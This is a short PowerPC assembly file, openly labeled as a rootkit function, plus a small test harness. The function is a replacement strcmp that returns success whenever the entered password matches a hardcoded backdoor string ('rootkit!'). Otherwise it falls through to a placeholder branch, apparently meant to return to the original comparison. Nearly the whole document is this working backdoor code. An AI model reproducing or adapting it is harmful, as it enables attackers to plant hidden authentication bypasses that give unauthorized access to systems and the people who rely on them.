.text
.globl _start
# START ROOTKIT FUNCTION
_strcmp:
  mflr %r0 # Save LR
  stw %r3, -0x8(%r1) # Save r3
  stw %r4, -0xc(%r1) # Save r4
  stw %r5, -0x10(%r1) # Save r5
  stw %r6, -0x14(%r1) # Save r6
  stw %r7, -0x18(%r1) # Save r7
  xor. %r4, %r4, %r4 # r4 = 0
  bnel _strcmp # Donбоt jump but save LR
  mflr %r4 # Move *this* addr to r4
  addi %r4, %r4, 96 # (Lines from one above to rkPass) * 4
  xor %r5, %r5, %r5 # r5 = 0
_loop:
  lbz %r6, 0(%r3) # r6 = (byte)enteredpassword[i]
  lbz %r7, 0(%r4) # r7 = (byte)rootkitpassword[i]
  cmpwi %r7, 0 # At the \0 in rootkitpass?
  beq _success # If we are at \0 then password matched rootkits
  cmpw %r6, %r7 # Does r6 == r7 ?
  bne _fail # No? Then branch to _fail
  addi %r3, %r3, 1 # else r3 += 1
  addi %r4, %r4, 1 # r4 += 1
  b _loop # Branch to _loop
_success:
  li %r3, 1 # SUCCESS
  b _fix_up # jmp to _fix_up
_fail:
  lwz %r3, -0x8(%r1) # restore r3
_fix_up:
  lwz %r4, -0xc(%r1) # restore r4
  lwz %r5, -0x10(%r1) # restore r5
  lwz %r6, -0x14(%r1) # restore r6
  lwz %r7, -0x18(%r1) # restore r7
  mtlr %r0 # r0 = LR
  cmpwi %r3, 1 # compare r3 = 1 ?
  beq _success_ret # if so jmp to _success_ret
  b 0x00000000 # if not branch to
_success_ret:
  blr # r0 set from beginning
rkPass:
  .ascii "rootkit!"
  .long 0
# END ROOTKIT FUNCTION
_start:
  lis %r3, enteredPass@ha
  addi %r3, %r3, enteredPass@l
  bl _strcmp
  li %r0, 1
  li %r3, 0
  sc
enteredPass: .ascii "realPassEntered!"
.long 0